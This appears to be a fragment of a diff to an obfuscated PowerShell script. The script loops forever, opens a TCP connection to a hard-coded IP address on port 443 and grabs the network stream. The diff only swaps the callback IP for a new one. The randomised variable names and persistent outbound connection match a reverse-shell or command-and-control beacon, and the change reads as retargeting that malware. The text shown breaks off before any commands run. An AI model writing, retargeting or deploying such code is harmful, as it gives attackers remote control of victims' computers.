@@ -1,7 +1,7 @@
 $code = @'
 while ($true) {
     try {
-        $xDVlCvoMdHgpL = New-Object System.Net.Sockets.TCPClient('34.147.160.145', 443)
+        $xDVlCvoMdHgpL = New-Object System.Net.Sockets.TCPClient('35.181.49.167', 443)
         if ($xDVlCvoMdHgpL.Connected) {
             $VrH5Qud0LjAtoh67B = $xDVlCvoMdHgpL.GetStream()
             $wfAa7Iy8HZOUl = [DateTime]::Now
